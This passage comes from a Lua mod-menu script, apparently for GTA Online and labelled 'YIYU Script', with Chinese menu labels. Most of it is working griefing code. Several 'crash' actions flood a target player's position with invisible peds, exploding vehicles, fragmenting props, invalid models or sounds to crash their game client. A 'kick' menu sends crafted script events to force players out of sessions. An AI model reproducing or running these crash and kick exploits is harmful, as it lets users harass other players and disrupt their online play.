                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    entities.delete_by_handle(object)
                    local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    util.yield(5)
                    entities.delete_by_handle(object)
                    end
                end)
            end)

    menu.toggle_loop(Crash, "循环0x崩溃", {""}, "", function(PlayerID)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        
        local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,1672152130,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)   
        util.yield(800)
        entities.delete_by_handle(PED1)
    end)   
    menu.action(Crash, "0x崩溃++", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local mdl = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(mdl) do
            STREAMING.REQUEST_MODEL(mdl)
            util.yield(5)
        end

        local ped = {}
        for i = 1, 10 do 
            local coord = ENTITY.GET_ENTITY_COORDS(player, true)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            ped[i] = entities.create_ped(0, mdl, coord, 0)

            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")

            ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
            util.yield(25)
        end
        util.yield(2500)
        for i = 1, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(25)
        end

    end) 

    menu.action(Crash, "INSHALLAH崩溃", {"crash11"}, "", function()
        local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        local PED1  = CreatePed(100,-1011537562,TargetPPos,0)
        local PED2  = CreatePed(100,-541762431,TargetPPos,0)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
        util.yield(1000)
        TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
        TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    end)
     
      menu.action(Crash, "无效外观崩溃", {"crash12"}, "", function()
      menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)


     
 
      menu.action(Crash, "复仇者崩溃", {"crash13"}, "美杜莎崩溃改版", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        plauuepos.x = plauuepos.x + 5
        plauuepos.z = plauuepos.z + 5
        local hunter = {}
        for i = 1 ,3 do
            for n = 0,120 do
                hunter[n] = CreateVehicle(-2118308144,plauuepos,0)
                util.yield(0)
                ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
                util.yield(0)
                VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
            end
            util.yield(190)
            for i = 1,#hunter do
                if hunter[i] ~= nil then
                    entities.delete_by_handle(hunter[i])
                end
            end
        end
        hunter = nil
        plauuepos = nil	
    end)  
    menu.action(Crash, "美杜莎崩溃", {""}, "", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        plauuepos.x = plauuepos.x + 5
        plauuepos.z = plauuepos.z + 5
        local hunter = {}
        for i = 1 ,3 do
            for n = 0,120 do
                hunter[n] = CreateVehicle(1077420264,plauuepos,0)
                util.yield(0)
                ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
                util.yield(0)
                VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
            end
            util.yield(190)
            for i = 1,#hunter do
                if hunter[i] ~= nil then
                    entities.delete_by_handle(hunter[i])
                end
            end
        end
        hunter = nil
        plauuepos = nil	
    end)  
      
    menu.action(Crash, "无效附加模型崩溃", {"crash14"}, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza5 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza6 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza7 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza8 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza9 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza10 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza11 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza12 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza13 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza14 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza15 = CreateObject(868868440, TargetPlayerPos)
        local Object_pizza16 = CreateObject(1030400667, TargetPlayerPos)
        local Object_pizza17 = CreateObject(1030400667, TargetPlayerPos)
        local Object_pizza18 = CreateObject(1030400667, TargetPlayerPos)
        local Object_pizza19 = CreateObject(1030400667, TargetPlayerPos)
        local Object_pizza20 = CreateObject(1030400667, TargetPlayerPos)
        local Object_pizza21 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza22 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 10, 1000 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(1)
        end
        util.yield(1500)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza5)
        entities.delete_by_handle(Object_pizza6)
        entities.delete_by_handle(Object_pizza7)
        entities.delete_by_handle(Object_pizza8)
        entities.delete_by_handle(Object_pizza9)
        entities.delete_by_handle(Object_pizza10)
        entities.delete_by_handle(Object_pizza11)
        entities.delete_by_handle(Object_pizza12)
        entities.delete_by_handle(Object_pizza13)
        entities.delete_by_handle(Object_pizza14)
        entities.delete_by_handle(Object_pizza15)
        entities.delete_by_handle(Object_pizza16)
        entities.delete_by_handle(Object_pizza17)
        entities.delete_by_handle(Object_pizza18)
        entities.delete_by_handle(Object_pizza19)
        entities.delete_by_handle(Object_pizza20)
        entities.delete_by_handle(Object_pizza21)
        entities.delete_by_handle(Object_pizza22)
        menu.trigger_commands("anticrashcam off")
        end)


menu.click_slider(Crash, "网络声音崩溃" , {}, "",1, 2, 1, 1, function(on_change)
	if on_change == 1 then
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            util.yield()
        end
	end
	if on_change == 2 then
	    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 1000
        while time > util.current_time_millis() do
        local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x,pos.y,pos.z, 'GTAO_FM_Events_Soundset', true, 10000, false)
        end

        util.yield()
		end
    end

	end)
 
    menu.action(Crash, "鬼崩", {"crash15"}, "", function()
        menu.trigger_commands("anticrashcam on")
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
        local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
        local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
        end
        menu.trigger_commands("anticrashcam off")
    end)



  
 
    kick= menu.list(PlayerMainMenu, "踢出", {}, "", function(); end)
    menu.action(kick, "脚本事件踢出", {}, "", function()
        util.trigger_script_event(1 << pid, {1104117595, pid, 1, 0, 2, math.random(14, 267), 3, 1})
        util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)}) 
        util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
        util.trigger_script_event(1 << pid, {697566862, pid, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << pid, {1268038438, pid, memory.script_global(2657589 + 1 + (pid * 466) + 321 + 8)})
        util.trigger_script_event(1 << pid, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))})
        menu.trigger_commands("givesh" .. players.get_name(pid))
    end)
    menu.action(kick, "智能踢", {""}, "", function()
        menu.trigger_commands("kick" .. players.get_name(pid))
    end)
        menu.action(kick, "非主机踢", {""}, "", function()
            menu.trigger_commands("nonhostkick" .. players.get_name(pid))
end)






end
cur_names = {}
players.on_join(function(pid)
    set_up_player_actions(pid)
end)

players.dispatch_on_join()

util.keep_running()


menu.trigger_commands("yiyuscriptname on")
menu.trigger_commands("yiyuhostqu off")
menu.trigger_commands("yiyuluascript")

util.on_stop(function()
    util.show_corner_help("~b~已关闭".. SCRIPT_FILENAME .."\n~s~感谢使用 ~w~^ ^")
    notification("感谢使用YIYU Script :D", colors.black)
end)
